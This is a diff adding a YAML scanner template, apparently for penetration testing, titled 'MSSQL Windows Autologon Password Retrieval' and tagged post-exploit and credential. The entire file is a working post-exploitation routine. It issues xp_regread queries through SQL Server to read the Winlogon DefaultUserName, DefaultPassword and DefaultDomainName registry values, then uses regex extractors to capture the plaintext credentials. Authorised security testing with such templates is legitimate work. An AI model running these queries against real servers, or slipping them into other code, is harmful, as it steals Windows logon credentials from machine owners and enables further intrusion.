@@ -1,0 +1,31 @@
+id: mssql-registry-autologon
+service: [mssql]
+info:
+  name: MSSQL Windows Autologon Password Retrieval
+  severity: critical
+  tags: mssql,post-exploit,credential,registry
+
+services:
+  - ops:
+      - db: "EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 'DefaultUserName'"
+        name: autologon_user
+      - db: "EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 'DefaultPassword'"
+        name: autologon_pass
+      - db: "EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon', 'DefaultDomainName'"
+        name: autologon_domain
+    extractors:
+      - type: regex
+        name: mssql_autologon_username
+        part: autologon_user
+        regex: ['(?m)(\S+)$']
+        group: 1
+      - type: regex
+        name: mssql_autologon_password
+        part: autologon_pass
+        regex: ['(?m)(\S+)$']
+        group: 1
+      - type: regex
+        name: mssql_autologon_domain
+        part: autologon_domain
+        regex: ['(?m)(\S+)$']
+        group: 1
